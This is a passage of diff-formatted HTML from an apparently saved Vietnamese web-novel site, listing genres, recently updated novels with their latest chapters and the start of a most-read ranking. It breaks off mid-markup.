+									<option value="5be1d1492b9b392d52d2ff68">Phương Tây</option>
+								
+									<option value="5be681599d614d46ffa64213">Nữ Phụ</option>
+								
+									<option value="5be7bd9e5ce85f4bc1f513c7">Light Novel</option>
+								
+									<option value="5be1b09ee2f0522ba9218078">Việt Nam</option>
+								
+									<option value="5be686be9d614d46ffa64cae">Đoản Văn</option>
+								
+									<option value="5be68b279d614d46ffa65726">Khác</option>
+								
+            	</select><div class="custom-select sources"><span class="custom-select-trigger">Tất cả</span><div class="custom-options"><span class="custom-option undefined" data-value="">Tất cả</span><span class="custom-option undefined" data-value="5c552b080883cb449f3ee186"></span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe4">Tiên Hiệp</span><span class="custom-option undefined" data-value="5be109e6b22428286417369f">Kiếm Hiệp</span><span class="custom-option undefined" data-value="5bdec27dc551731a60abe1ff">Ngôn Tình</span><span class="custom-option undefined" data-value="5bdec27dc551731a60abe201">Đô Thị</span><span class="custom-option undefined" data-value="5be6a6689d614d46ffa68d92">Quan Trường</span><span class="custom-option undefined" data-value="5bdf022606c7c41b7eea55c0">Võng Du</span><span class="custom-option undefined" data-value="5bdf18bc06c7c41b7eea8070">Khoa Huyễn</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b9">Huyền Huyễn</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b6">Dị Giới</span><span class="custom-option undefined" data-value="5be1c56b1b07282cdf88e775">Dị Năng</span><span class="custom-option undefined" data-value="5be67f9e9d614d46ffa63eb4">Quân Sự</span><span class="custom-option undefined" data-value="5be1b09ee2f0522ba9218079">Lịch Sử</span><span class="custom-option undefined" data-value="5bdecab406c7c41b7eea20b8">Xuyên Không</span><span class="custom-option undefined" data-value="5bdfb00f8ee5f91f329931cc">Trọng Sinh</span><span class="custom-option undefined" data-value="5be268277f0e2b2fdfe6461c">Trinh Thám</span><span class="custom-option undefined" data-value="5be25add7f0e2b2fdfe62c1b">Thám Hiểm</span><span class="custom-option undefined" data-value="5be2af29ea81db31673b318f">Linh Dị</span><span class="custom-option undefined" data-value="5be10a0ab2242828641736e8">Sắc</span><span class="custom-option undefined" data-value="5be1bbf9e2f0522ba92180d5">Ngược</span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe8">Sủng</span><span class="custom-option undefined" data-value="5be3b84d6e8d9936a27d6602">Cung Đấu</span><span class="custom-option undefined" data-value="5be1be3ce2f0522ba9218544">Nữ Cường</span><span class="custom-option undefined" data-value="5be2639f7f0e2b2fdfe63d31">Gia Đấu</span><span class="custom-option undefined" data-value="5be679bc9d614d46ffa62b08">Đông Phương</span><span class="custom-option undefined" data-value="5bdf162c06c7c41b7eea7b78">Đam Mỹ</span><span class="custom-option undefined" data-value="5be7208e5ce85f4bc1f4ca89">Bách Hợp</span><span class="custom-option undefined" data-value="5bdec66306c7c41b7eea0fe6">Hài Hước</span><span class="custom-option undefined" data-value="5be266f47f0e2b2fdfe643b9">Điền Văn</span><span class="custom-option undefined" data-value="5be10a3ab224282864173745">Cổ Đại</span><span class="custom-option undefined" data-value="5be267aa7f0e2b2fdfe64523">Mạt Thế</span><span class="custom-option undefined" data-value="5bdefffe06c7c41b7eea519b">Truyện Teen</span><span class="custom-option undefined" data-value="5be1d1492b9b392d52d2ff68">Phương Tây</span><span class="custom-option undefined" data-value="5be681599d614d46ffa64213">Nữ Phụ</span><span class="custom-option undefined" data-value="5be7bd9e5ce85f4bc1f513c7">Light Novel</span><span class="custom-option undefined" data-value="5be1b09ee2f0522ba9218078">Việt Nam</span><span class="custom-option undefined" data-value="5be686be9d614d46ffa64cae">Đoản Văn</span><span class="custom-option undefined" data-value="5be68b279d614d46ffa65726">Khác</span></div></div></div>
+						</div>
+          </div>
+        </div>
+        <div class="box-book-update">
+          <ul>
+  
+    <li>
+      <a href="https://truyennhieu.com/nguoi-tinh-tri-mang" class="img-left" title="Người Tình Trí Mạng - Ân Tầm">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1559003190/truyen/nguoi-tinh-tri-mang.jpg" title="Người Tình Trí Mạng - Ân Tầm" alt="Nguoi Tinh Tri Mang - An Tam" src="./truyennhieu_files/nguoi-tinh-tri-mang.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/nguoi-tinh-tri-mang" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Ân Tầm sáng tác">Người Tình Trí Mạng</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/an-tam/5be021c0b19786223c89a3d5" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ân Tầm sáng tác">Ân Tầm</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/nguoi-tinh-tri-mang/chuong-506" class="name-chapter ellipsis-1">Chương 505: Ai bảo cô ấy xinh chứ</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/nguoi-tinh-tri-mang/chuong-505" class="name-chapter ellipsis-1">Chương 504: Không tránh mặt</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/yeu-em-kho-lam-ha-anh" class="img-left" title="Yêu Em Khó Lắm Hả Anh? - Virgomeoconnho">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1560682210/truyen/yeu-em-kho-lam-ha-anh.jpg" title="Yêu Em Khó Lắm Hả Anh? - Virgomeoconnho" alt="Yeu Em Kho Lam Ha Anh - Virgomeoconnho" src="./truyennhieu_files/yeu-em-kho-lam-ha-anh.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/yeu-em-kho-lam-ha-anh" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Virgomeoconnho sáng tác">Yêu Em Khó Lắm Hả Anh?</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/virgomeoconnho/5bee377f4858996227dcce7a" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Virgomeoconnho sáng tác">Virgomeoconnho</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/yeu-em-kho-lam-ha-anh/chuong-26" class="name-chapter ellipsis-1">Chương 26: Anh đâu rồi. Mau giúp em</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/yeu-em-kho-lam-ha-anh/chuong-25" class="name-chapter ellipsis-1">Chương 25: Dự tiệc</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/tong-tai-cuong-the-phu-nhan-da-tro-ve" class="img-left" title="Tổng Tài Cuồng Thê, Phu Nhân Đã Trở Về! - Uyên Tố Tố">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1562486529/truyen/tong-tai-cuong-the-phu-nhan-da-tro-ve.jpg" title="Tổng Tài Cuồng Thê, Phu Nhân Đã Trở Về! - Uyên Tố Tố" alt="Tong Tai Cuong The Phu Nhan Da Tro Ve - Uyen To To" src="./truyennhieu_files/tong-tai-cuong-the-phu-nhan-da-tro-ve.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/tong-tai-cuong-the-phu-nhan-da-tro-ve" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Uyên Tố Tố sáng tác">Tổng Tài Cuồng Thê, Phu Nhân Đã Trở Về!</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/uyen-to-to/5be6c29c9d614d46ffa6c6cc" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Uyên Tố Tố sáng tác">Uyên Tố Tố</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/tong-tai-cuong-the-phu-nhan-da-tro-ve/chuong-32" class="name-chapter ellipsis-1">Chương 32: Ai cao tay hơn ai ?</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/tong-tai-cuong-the-phu-nhan-da-tro-ve/chuong-31" class="name-chapter ellipsis-1">Chương 31: Vả mặt</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/nhat-ngon-thong-thien" class="img-left" title="Nhất Ngôn Thông Thiên - Hắc Huyền">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1557346054/truyen/nhat-ngon-thong-thien.jpg" title="Nhất Ngôn Thông Thiên - Hắc Huyền" alt="Nhat Ngon Thong Thien - Hac Huyen" src="./truyennhieu_files/nhat-ngon-thong-thien.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/nhat-ngon-thong-thien" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Hắc Huyền sáng tác">Nhất Ngôn Thông Thiên</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/hac-huyen/5bdfb8e08ee5f91f329952ec" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hắc Huyền sáng tác">Hắc Huyền</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/nhat-ngon-thong-thien/chuong-673" class="name-chapter ellipsis-1">Quyển 6 - Chương 673: Tổng bộ Trảm Yêu Minh</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/nhat-ngon-thong-thien/chuong-672" class="name-chapter ellipsis-1">Quyển 6 - Chương 672: Ta sắp chín cả rồi!</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/lam-vu-thien-ha" class="img-left" title="Lâm Vũ Thiên Hạ - Ngạo Thiên Mộng Nhập Thiên Cơ">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1557346054/truyen/lam-vu-thien-ha.jpg" title="Lâm Vũ Thiên Hạ - Ngạo Thiên Mộng Nhập Thiên Cơ" alt="Lam Vu Thien Ha - Ngao Thien Mong Nhap Thien Co" src="./truyennhieu_files/lam-vu-thien-ha.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/lam-vu-thien-ha" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Ngạo Thiên Mộng Nhập Thiên Cơ sáng tác">Lâm Vũ Thiên Hạ</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/ngao-thien-mong-nhap-thien-co/5ca863990883cb449f40b85b" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ngạo Thiên Mộng Nhập Thiên Cơ sáng tác">Ngạo Thiên Mộng Nhập Thiên Cơ</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/lam-vu-thien-ha/chuong-299" class="name-chapter ellipsis-1">Chương 299: Hồ máu quỷ dị</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/lam-vu-thien-ha/chuong-298" class="name-chapter ellipsis-1">Chương 298: Địa phương quỷ dị</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/thu-tu-thanh-than" class="img-left" title="Thú Tu Thành Thần - cuuviho1687">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1556391028/truyen/thu-tu-thanh-than.jpg" title="Thú Tu Thành Thần - cuuviho1687" alt="Thu Tu Thanh Than - Cuuviho1687" src="./truyennhieu_files/thu-tu-thanh-than.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/thu-tu-thanh-than" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả cuuviho1687 sáng tác">Thú Tu Thành Thần</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/cuuviho1687/5be1d4c54727d32dff65c91b" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả cuuviho1687 sáng tác">cuuviho1687</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/thu-tu-thanh-than/chuong-762" class="name-chapter ellipsis-1">Chương 763: Nhân lực thiếu thốn</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/thu-tu-thanh-than/chuong-761" class="name-chapter ellipsis-1">Chương 762: Thiên Khánh và U Minh</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/tieu-bach-kiem-nhan-gia-tai-di-gioi" class="img-left" title="Tiểu Bạch Kiểm Nhẫn Giả Tại Dị Giới - Skldjeu@">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1559374853/truyen/tieu-bach-kiem-nhan-gia-tai-di-gioi.jpg" title="Tiểu Bạch Kiểm Nhẫn Giả Tại Dị Giới - Skldjeu@" alt="Tieu Bach Kiem Nhan Gia Tai Di Gioi - Skldjeu" src="./truyennhieu_files/tieu-bach-kiem-nhan-gia-tai-di-gioi.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/tieu-bach-kiem-nhan-gia-tai-di-gioi" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Skldjeu@ sáng tác">Tiểu Bạch Kiểm Nhẫn Giả Tại Dị Giới</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/skldjeu/5cefea9ca288ba7b3e204ccc" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Skldjeu@ sáng tác">Skldjeu@</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/tieu-bach-kiem-nhan-gia-tai-di-gioi/chuong-232" class="name-chapter ellipsis-1">Chương 225: Tin tức về Akatsuki</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/tieu-bach-kiem-nhan-gia-tai-di-gioi/chuong-231" class="name-chapter ellipsis-1">Chương 224: Nữ truy Nam</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/chong-yeu-la-quy" class="img-left" title="Chồng Yêu Là Quỷ - Lâm Lâm">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1559003191/truyen/chong-yeu-la-quy.jpg" title="Chồng Yêu Là Quỷ - Lâm Lâm" alt="Chong Yeu La Quy - Lam Lam" src="./truyennhieu_files/chong-yeu-la-quy.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/chong-yeu-la-quy" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Lâm Lâm sáng tác">Chồng Yêu Là Quỷ</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/lam-lam/5ccfc6b5a288ba7b3e1fd697" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Lâm Lâm sáng tác">Lâm Lâm</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/chong-yeu-la-quy/chuong-571" class="name-chapter ellipsis-1">Chương 257-2</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/chong-yeu-la-quy/chuong-570" class="name-chapter ellipsis-1">Chương 257</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/phuong-nghien-tran-quoc" class="img-left" title="Phượng Nghiên Trấn Quốc - JFang">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://cdnaz.truyenfull.vn/cover/eJzLyTDWN3U01vUuSM0L8q30tyxJNo80qsy3cDEOdE6pTHbN98h1D_XM1y0MLTbMCY4PTg9xTYqqdDYyzEsyS3P09_UOdywM9qgIzIiI9HAKcslLKS3LK0u3LTcyNNXNMDYyAgANcB-Z/phuong-nghien-tran-quoc.jpg" title="Phượng Nghiên Trấn Quốc - JFang" alt="Phuong Nghien Tran Quoc - Jfang" src="./truyennhieu_files/phuong-nghien-tran-quoc.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/phuong-nghien-tran-quoc" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả JFang sáng tác">Phượng Nghiên Trấn Quốc</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/jfang/5d25e15da288ba7b3e20c215" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả JFang sáng tác">JFang</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/phuong-nghien-tran-quoc/chuong-4" class="name-chapter ellipsis-1">Chương 3</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/phuong-nghien-tran-quoc/chuong-3" class="name-chapter ellipsis-1">Chương 2: Tử vong [2]</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/su-huynh-rat-vo-luong" class="img-left" title="Sư Huynh, Rất Vô Lương - Tương Ba Lục">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1556728201/truyen/su-huynh-rat-vo-luong.jpg" title="Sư Huynh, Rất Vô Lương - Tương Ba Lục" alt="Su Huynh Rat Vo Luong - Tuong Ba Luc" src="./truyennhieu_files/su-huynh-rat-vo-luong.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/su-huynh-rat-vo-luong" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Tương Ba Lục sáng tác">Sư Huynh, Rất Vô Lương</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/tuong-ba-luc/5be884775ce85f4bc1f5a0af" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tương Ba Lục sáng tác">Tương Ba Lục</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/su-huynh-rat-vo-luong/chuong-337" class="name-chapter ellipsis-1">Quyển 3 - Chương 62: Âm mưu bại lộ</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/su-huynh-rat-vo-luong/chuong-336" class="name-chapter ellipsis-1">Quyển 3 - Chương 61</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/dien-duyen" class="img-left" title="Điền Duyên - Hương Thôn Nguyên Dã">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1544270638/truyen/1597_miyatf.jpg" title="Điền Duyên - Hương Thôn Nguyên Dã" alt="Dien Duyen - Huong Thon Nguyen Da" src="./truyennhieu_files/1597_miyatf.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/dien-duyen" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả Hương Thôn Nguyên Dã sáng tác">Điền Duyên</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/huong-thon-nguyen-da/5be52d462a39d0411744d949" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Hương Thôn Nguyên Dã sáng tác">Hương Thôn Nguyên Dã</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/dien-duyen/chuong-386" class="name-chapter ellipsis-1">Chương 386: Dụ bức</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/dien-duyen/chuong-385" class="name-chapter ellipsis-1">Chương 385: Đối chọi gay gắt</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+    <li>
+      <a href="https://truyennhieu.com/thanh-trieu-ngoai-su-2" class="img-left" title="Thanh Triều Ngoại Sử 2 - THH">
+        <div class="box-absolute fn-shadow">
+          <div class="img">
+            <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1556590346/truyen/thanh-trieu-ngoai-su-2.jpg" title="Thanh Triều Ngoại Sử 2 - THH" alt="Thanh Trieu Ngoai Su 2 - Thh" src="./truyennhieu_files/thanh-trieu-ngoai-su-2.jpg" data-loaded="true">
+          </div>
+        </div>
+      </a>
+      <div class="box-book-info">
+        <h3 class="font-title ellipsis-1">
+          <a href="https://truyennhieu.com/thanh-trieu-ngoai-su-2" class="name-book" title="Tìm các tác phẩm, truyện thơ do tác giả THH sáng tác">Thanh Triều Ngoại Sử 2</a>
+        </h3>
+        <h4 class="show-author">
+          <a href="https://truyennhieu.com/tac-gia/thh/5be680129d614d46ffa63f91" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả THH sáng tác">THH</a>
+        </h4>
+        
+          <div class="list-chapter">
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/thanh-trieu-ngoai-su-2/chuong-106" class="name-chapter ellipsis-1">Chương 106: Trốn chạy (thượng)</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+              <div class="item-chapter">
+                <a href="https://truyennhieu.com/thanh-trieu-ngoai-su-2/chuong-105" class="name-chapter ellipsis-1">Chương 105: Giải độc</a>
+                <!--<span class="time-update">2 phút trước</span>-->
+              </div>
+            
+          </div>
+        
+      </div>
+    </li>
+  
+  <!--end list book 3 item -->
+</ul>
+
+        </div>
+      </div>
+      <div class="right-content">
+          <div class="book-doctruyen hide">
+              <div class="tile-main-title">
+                  <div class="box-icon"> <i class="truyenn-icon_calendar"></i> </div>
+                  <div class="box-txt-show">
+                      <h2>Truyện đã xem</h2>
+                  </div>
+              </div>
+              <div class="doctruyen-item">
+                  <ul>
+                  </ul>
+              </div>
+          </div>
+          <div class="box-book-chart">
+    <div class="tile-main-title">
+          <div class="box-icon"> <i class="truyenn-icon-eye"></i> </div>
+          <div class="box-txt-show">
+            <h2>Truyện đọc nhiều</h2>
+          </div>
+        </div>
+
+       <div class="book-chart">
+    <ul>
+      
+        <li>
+          <span class="manga-title-badges top1">1</span>
+          
+            <a href="https://truyennhieu.com/thay-chi-lay-chong" class="img-left" title="Thay Chị Lấy Chồng - Mộc Tâm">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                    <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1556385335/truyen/thay-chi-lay-chong.jpg" title="Thay Chị Lấy Chồng - Mộc Tâm" alt="Thay Chi Lay Chong - Moc Tam" src="./truyennhieu_files/thay-chi-lay-chong.jpg" data-loaded="true">
+                </div>
+              </div>
+             </a>
+          
+
+          
+            <div class="box-book-info">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/thay-chi-lay-chong" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mộc Tâm sáng tác">Thay Chị Lấy Chồng</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/moc-tam/5be698589d614d46ffa6716e" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Mộc Tâm sáng tác">Mộc Tâm</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges top2">2</span>
+          
+            <a href="https://truyennhieu.com/mat-ngot-uot-at" class="img-left" title="Mật Ngọt Ướt Át - Ngọ Dạ Quả Quả">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                    <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1557346054/truyen/mat-ngot-uot-at.jpg" title="Mật Ngọt Ướt Át - Ngọ Dạ Quả Quả" alt="Mat Ngot Uot At - Ngo Da Qua Qua" src="./truyennhieu_files/mat-ngot-uot-at.jpg" data-loaded="true">
+                </div>
+              </div>
+             </a>
+          
+
+          
+            <div class="box-book-info">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/mat-ngot-uot-at" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ngọ Dạ Quả Quả sáng tác">Mật Ngọt Ướt Át</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/ngo-da-qua-qua/5c8549bb0883cb449f403a08" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Ngọ Dạ Quả Quả sáng tác">Ngọ Dạ Quả Quả</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges top3">3</span>
+          
+            <a href="https://truyennhieu.com/quyen-ru-dan-ong-da-co-vo" class="img-left" title="Quyến Rũ Đàn Ông Đã Có Vợ - Đông Bôn Tây Cố">
+              <div class="box-absolute fn-shadow">
+                <div class="img">
+                    <img class="lozad" data-src="https://res.cloudinary.com/truyennhieu-images/image/upload/v1556389846/truyen/quyen-ru-dan-ong-da-co-vo.jpg" title="Quyến Rũ Đàn Ông Đã Có Vợ - Đông Bôn Tây Cố" alt="Quyen Ru Dan Ong Da Co Vo - Dong Bon Tay Co" src="./truyennhieu_files/quyen-ru-dan-ong-da-co-vo.jpg" data-loaded="true">
+                </div>
+              </div>
+             </a>
+          
+
+          
+            <div class="box-book-info">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/quyen-ru-dan-ong-da-co-vo" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Đông Bôn Tây Cố sáng tác">Quyến Rũ Đàn Ông Đã Có Vợ</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/dong-bon-tay-co/5be7aca45ce85f4bc1f4f1d9" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Đông Bôn Tây Cố sáng tác">Đông Bôn Tây Cố</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">4</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
+              <a href="https://truyennhieu.com/tong-tai-hoi-vo-banh-bao-lam-mai-daddy-tong-tai" class="name-book ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tịch Bảo Nhi sáng tác">Tổng Tài Hỏi Vợ: Bánh Bao Làm Mai (Daddy Tổng Tài)</a>
+            </h3>
+            <h4 class="show-author"><a href="https://truyennhieu.com/tac-gia/tich-bao-nhi/5bffaf394170ae2f490ce001" class="name-author ellipsis-1" title="Tìm các tác phẩm, truyện thơ do tác giả Tịch Bảo Nhi sáng tác">Tịch Bảo Nhi</a></h4>
+          </div>
+        </li>
+      
+        <li>
+          <span class="manga-title-badges other">5</span>
+          
+
+          
+            <div class="box-book-info full-w">
+          
+            <h3 class="font-title" itemprop="name">
